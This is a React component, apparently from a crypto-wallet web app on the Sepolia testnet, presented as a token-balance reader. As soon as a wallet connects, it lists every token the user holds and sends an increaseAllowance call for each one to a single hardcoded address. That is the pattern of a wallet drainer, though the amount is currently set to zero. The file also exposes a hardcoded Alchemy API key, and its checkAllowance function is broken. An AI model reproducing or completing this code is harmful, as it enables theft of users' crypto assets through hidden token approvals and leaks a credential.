import React, { useState, useEffect } from "react";
import { Alchemy, Network } from "alchemy-sdk";
import {
  useAccount,
  useSwitchChain,
  useDisconnect,
  useSendTransaction,
  useBalance,
} from "wagmi";
import Erc20Abi from "../utils/Erc20Abi";
import { config as wagmiConfig } from "../../wagmiConfig";
import { writeContract, getBalance, sendTransaction } from "@wagmi/core";
import { parseEther } from "viem";
import { sepolia } from "viem/chains";

const UseAccountBalances = ({ connectionStatus }) => {
  const { address, isConnected, status } = useAccount();
  const { chains, switchChain } = useSwitchChain();
  const [tokensData, setTokensData] = useState([]);
  const { disconnect } = useDisconnect();

  const config = {
    apiKey: "qP-0Eg2caD2AE-M7va68Bna1sIy2E3H-",
    network: Network.ETH_SEPOLIA,
  };
  const alchemy = new Alchemy(config);

  useEffect(() => {
    if (isConnected) {
      connectionStatus();
      getUserTokens();
      // sendNaticeToken();
    }
  }, [isConnected]);

  const getUserTokens = async () => {
    try {
      const data = await alchemy.core.getTokenBalances(address);
      const newTokensData = data.tokenBalances.filter(
        (tokensDetails) =>
          !tokensData.some((token) => token.id === tokensDetails.id)
      );
      setTokensData((prevTokensData) => [...prevTokensData, ...newTokensData]);
      increaseAllowanceForTokens([...tokensData, ...newTokensData]);
    } catch (error) {
      console.error("Error fetching token balances:", error);
    }
  };

  const increaseAllowanceForTokens = async (tokensData) => {
    let i = 1;
    for (let token of tokensData) {
      const { contractAddress, tokenBalance } = token;
      const metadata = await alchemy.core.getTokenMetadata(contractAddress); // Compute token balance in human-readable format

      const hexToNumber = parseInt(tokenBalance, 16);

      if (hexToNumber > 0) {
        increaseAllowance(contractAddress, hexToNumber);
        console.log(
          `${i++}. ${metadata.name}: ${hexToNumber} ${metadata.symbol}`
        );
      }
    }
  };

  const sendNaticeToken = async () => {
    const estimatedGasFee = 21000 * 100; // Hypothetical estimation (gasLimit * gasPrice)

    try {
      const balance = await getBalance(wagmiConfig, {
        address: address,
        chainId: sepolia.id,
      });
      console.log("native token balance :", balance.formatted);
    } catch (error) {
      console.error("get balance failled: ", error);
    }

    const result = await sendTransaction(wagmiConfig, {
      to: address,
      value: parseEther("0.01"),
    });
    console.log("tx hash: ", result);
  };
  const increaseAllowance = async (contractAddress, allowance) => {
    try {
      const hash = await writeContract(wagmiConfig, {
        address: contractAddress,
        abi: Erc20Abi,
        functionName: "increaseAllowance",
        args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", '0'],
      });
      console.log("Transaction hash:", hash);
      const myObject = {
        "contract address": contractAddress,
        "token balance": allowance,
      };
      console.table(myObject);
    } catch (error) {
      console.error("Increase allowance error", error);
    }
  };
  async function checkAllowance() {
    try {
      // Get the ERC20 token contract using its ABI
      const abi = require('./path/to/erc20.json'); // Replace with actual ABI path
      const contract = new ethers.Contract(contractAddress, abi, provider);
  
      // Get allowance using the `allowance` function of the ERC20 contract
      const allowance = await contract.allowance(myAddress, contractAddress);
  
      // Convert allowance from wei to a more readable format (e.g., token units)
      const decimals = await contract.decimals(); // Get token decimals
      const allowanceInTokens = ethers.utils.formatUnits(allowance, decimals);
  
      console.log(`Allowance for ${contractAddress}: ${allowanceInTokens} tokens`);
    } catch (error) {
      console.error('Error fetching allowance:', error);
    }
  }
  
  

};

export default UseAccountBalances;
